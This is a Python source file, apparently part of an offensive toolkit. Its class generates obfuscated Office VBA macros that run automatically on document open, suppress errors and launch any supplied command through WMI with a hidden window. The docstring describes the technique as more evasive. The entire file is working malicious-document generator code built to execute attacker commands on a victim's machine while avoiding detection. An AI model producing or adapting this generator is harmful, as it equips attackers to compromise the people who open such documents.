#!/usr/bin/env python3
from ..utils.obfuscation import VBAObfuscator

class WMIExecutionMacro:
    """Generate macro using WMI for execution (more evasive)"""
    
    def __init__(self, command):
        self.command = command
        self.obf = VBAObfuscator()
    
    def generate(self):
        """Create WMI execution macro"""
        func_name = self.obf.random_var()
        var_wmi = self.obf.random_var()
        var_startup = self.obf.random_var()
        var_config = self.obf.random_var()
        var_process = self.obf.random_var()
        
        macro = self.obf.create_auto_open_stubs(func_name)
        
        macro += f'''
Private Sub {func_name}()
    On Error Resume Next
    
    Dim {var_wmi} As Object
    Dim {var_startup} As Object
    Dim {var_config} As Object
    Dim {var_process} As Object
    
    Set {var_wmi} = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set {var_startup} = {var_wmi}.Get("Win32_ProcessStartup")
    Set {var_config} = {var_startup}.SpawnInstance_
    {var_config}.ShowWindow = 0
    
    Set {var_process} = {var_wmi}.Get("Win32_Process")
    {var_process}.Create "{self.command}", Null, {var_config}, Null
End Sub
'''
        return macro.strip()